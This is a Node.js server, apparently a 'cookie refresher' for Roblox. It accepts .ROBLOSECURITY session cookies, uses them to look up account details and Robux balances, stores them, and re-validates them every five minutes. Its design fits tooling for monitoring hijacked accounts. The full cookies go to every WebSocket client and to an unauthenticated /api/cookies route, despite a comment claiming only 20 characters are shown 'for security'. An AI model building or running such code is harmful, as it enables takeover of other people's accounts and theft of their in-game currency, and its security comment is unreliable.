
const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const WebSocket = require('ws');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static('public'));

// Store active cookies and their info
const activeCookies = new Map();

// WebSocket connections for real-time updates
const clients = new Set();

wss.on('connection', (ws) => {
    clients.add(ws);
    console.log('Client connected');
    
    // Send current cookie data to new client
    ws.send(JSON.stringify({
        type: 'cookieList',
        cookies: Array.from(activeCookies.values())
    }));
    
    ws.on('close', () => {
        clients.delete(ws);
        console.log('Client disconnected');
    });
});

// Broadcast to all connected clients
function broadcast(data) {
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}

// Function to get user info from Roblox cookie
async function getRobloxUserInfo(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        const userId = response.data.id;
        const username = response.data.name;
        const displayName = response.data.displayName;
        
        // Get additional user details
        const detailsResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        
        // Get robux amount
        let robux = 0;
        try {
            const robuxResponse = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            });
            robux = robuxResponse.data.robux;
        } catch (e) {
            console.log('Could not fetch robux amount');
        }
        
        return {
            userId: userId,
            username: username,
            displayName: displayName,
            description: detailsResponse.data.description,
            created: detailsResponse.data.created,
            robux: robux,
            isValid: true,
            lastChecked: new Date().toISOString(),
            cookie: cookie.substring(0, 20) + '...' // Only show first 20 chars for security
        };
    } catch (error) {
        console.error('Error fetching user info:', error.message);
        return {
            isValid: false,
            error: error.message,
            lastChecked: new Date().toISOString(),
            cookie: cookie.substring(0, 20) + '...'
        };
    }
}

// Function to refresh a cookie's info
async function refreshCookie(cookieId) {
    const cookieData = activeCookies.get(cookieId);
    if (!cookieData) return;
    
    const fullCookie = cookieData.fullCookie;
    const userInfo = await getRobloxUserInfo(fullCookie);
    
    const updatedData = {
        ...cookieData,
        ...userInfo,
        id: cookieId
    };
    
    activeCookies.set(cookieId, updatedData);
    
    // Broadcast update to all clients
    broadcast({
        type: 'cookieUpdate',
        cookie: updatedData
    });
    
    return updatedData;
}

// Auto-refresh all cookies every 5 minutes
setInterval(async () => {
    console.log('Auto-refreshing all cookies...');
    for (const cookieId of activeCookies.keys()) {
        await refreshCookie(cookieId);
        // Wait 1 second between requests to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}, 5 * 60 * 1000);

// Routes
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.post('/api/add-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    const cookieId = Date.now().toString();
    const userInfo = await getRobloxUserInfo(cookie);
    
    const cookieData = {
        id: cookieId,
        fullCookie: cookie,
        ...userInfo
    };
    
    activeCookies.set(cookieId, cookieData);
    
    // Broadcast new cookie to all clients
    broadcast({
        type: 'cookieAdded',
        cookie: cookieData
    });
    
    res.json({ success: true, data: cookieData });
});

app.post('/api/refresh-cookie/:id', async (req, res) => {
    const cookieId = req.params.id;
    const updatedData = await refreshCookie(cookieId);
    
    if (updatedData) {
        res.json({ success: true, data: updatedData });
    } else {
        res.status(404).json({ error: 'Cookie not found' });
    }
});

app.delete('/api/remove-cookie/:id', (req, res) => {
    const cookieId = req.params.id;
    
    if (activeCookies.has(cookieId)) {
        activeCookies.delete(cookieId);
        
        // Broadcast removal to all clients
        broadcast({
            type: 'cookieRemoved',
            cookieId: cookieId
        });
        
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Cookie not found' });
    }
});

app.get('/api/cookies', (req, res) => {
    res.json(Array.from(activeCookies.values()));
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Roblox Cookie Refresher running on port ${PORT}`);
});
